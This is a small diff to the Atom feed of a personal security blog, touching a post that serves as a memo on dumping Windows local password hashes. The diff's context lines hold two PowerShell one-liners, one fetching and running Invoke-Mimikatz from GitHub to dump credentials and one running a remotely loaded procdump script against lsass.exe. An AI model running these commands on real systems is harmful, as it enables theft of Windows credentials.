@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://thekingofduck.github.io</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2020-02-23T21:24:52.999Z</updated>
+    <updated>2020-02-23T21:36:57.556Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://thekingofduck.github.io"/>
     <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
@@ -11,7 +11,7 @@
     <icon>https://thekingofduck.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
     <entry>
-        <title type="html"><![CDATA[## Windows本地hashdump备忘录]]></title>
+        <title type="html"><![CDATA[Windows本地hashdump备忘录]]></title>
         <id>https://thekingofduck.github.io/post/Dumping-Windows -Local-Credentials-Tools/</id>
         <link href="https://thekingofduck.github.io/post/Dumping-Windows -Local-Credentials-Tools/">
         </link>
@@ -87,7 +87,7 @@
 <pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
 </code></pre>
 <figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1582480293151.png" alt="" loading="lazy"></figure>
-<p>读一下代码会发现都是peloader做的，比如可以把procdump做成psh实现无文件dump。</p>
+<p>读一下代码会发现都是peloader做的，同理可以把procdump做成psh实现无文件dump。</p>
 <pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
 </code></pre>
 <figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1582492124419.png" alt="" loading="lazy"></figure>
